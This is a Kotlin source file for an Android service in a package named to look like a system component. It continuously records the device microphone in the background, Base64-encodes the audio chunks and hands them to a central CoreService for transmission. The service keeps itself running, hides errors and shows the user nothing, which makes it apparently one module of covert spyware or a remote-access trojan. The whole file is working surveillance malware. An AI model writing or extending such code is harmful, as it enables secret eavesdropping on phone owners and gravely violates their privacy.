package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean

class AudioStreamService : Service() {

    companion object {
        var isRunning = false
    }

    private val recording = AtomicBoolean(false)
    private var recordThread: Thread? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
        isRunning = true
        startStream()
        return START_STICKY
    }

    private fun startStream() {
        val sampleRate  = 16000
        val channelCfg  = AudioFormat.CHANNEL_IN_MONO
        val audioFmt    = AudioFormat.ENCODING_PCM_16BIT
        val bufSize     = AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt) * 4

        recording.set(true)
        recordThread = Thread {
            var recorder: AudioRecord? = null
            try {
                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate, channelCfg, audioFmt, bufSize)
                recorder.startRecording()
                val buf = ByteArray(bufSize)
                while (recording.get()) {
                    val read = recorder.read(buf, 0, buf.size)
                    if (read > 0) {
                        val chunk = Base64.encodeToString(buf.copyOf(read), Base64.NO_WRAP)
                        CoreService.instance?.sendData("mic_chunk", JSONObject().apply {
                            put("chunk", chunk)
                            put("sampleRate", sampleRate)
                        })
                    }
                    Thread.sleep(200)
                }
            } catch (_: Exception) {
            } finally {
                recorder?.stop(); recorder?.release()
            }
        }.apply { start() }
    }

    private fun stopStream() { recording.set(false); isRunning = false }

    override fun onDestroy() { stopStream(); super.onDestroy() }
    override fun onBind(intent: Intent?): IBinder? = null
}
